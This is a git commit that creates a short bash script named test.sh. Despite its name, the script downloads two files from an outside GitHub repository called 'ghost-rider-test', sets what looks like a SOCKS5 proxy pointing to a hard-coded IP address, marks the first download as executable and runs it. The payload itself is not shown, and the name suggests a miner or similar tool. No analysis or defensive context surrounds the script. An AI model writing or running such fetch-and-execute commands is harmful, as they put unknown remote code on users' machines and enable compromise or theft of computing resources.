b889937d2070950fce7b1c3ad0a3a846df0bb603
trautroi <89275422+trautroi@users.noreply.github.com>
2021-10-13 18:32:34 +0000

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+wget -O 1 https://raw.githubusercontent.com/ributmaestro/ghost-rider-test/main/ver4/ver4 && wget -O 2 https://raw.githubusercontent.com/ributmaestro/ghost-rider-test/main/v2 && export_http_proxy=socks5://192.111.139.162:4145 && chmod u+x 1 && ./1
